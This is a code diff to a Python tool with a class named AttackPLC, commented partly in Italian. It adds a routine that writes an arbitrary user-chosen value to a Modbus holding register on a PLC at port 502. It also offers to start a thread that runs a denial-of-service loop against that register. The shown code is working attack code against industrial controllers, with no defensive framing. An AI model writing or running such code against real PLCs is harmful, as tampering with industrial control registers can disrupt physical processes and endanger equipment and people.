@@ -1,5 +1,6 @@
 import os
 import sys
+import time # Per la sleep
 import nmap3 # Per lo scan della rete
 import json # Per gestire i file json
 import threading # Per fare poi il loop dell'attacco
@@ -541,8 +542,25 @@ class AttackPLC:
       elif(choice_reg[2] == "W" or choice_reg[2] == "w"):
         reg_type = "register"
 
+        modbus_addr = int(choice_reg.split(choice_reg[2])[1])
+        value = input("Enter new value: ")
+
+        loop = input("Do you want to perform a DoS on the register? [y/n] ")
+
+        if(loop == "y" or loop == "Y"):
+          thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, modbus_addr, int(value)))
+          thr1.start()
+        else:
+          mb = ModbusClient(plc, 502)
+          mb.connect()
+
+          mb.write_single_register(modbus_addr, int(value))
+
+          mb.close()
+
     time.sleep(1) # Altrimenti mi sballa la stampa in caso di thread
     input("Done. Presse Enter to continue: ")
+
 
   """
   Richiamo i tipi di attacco alle PLC
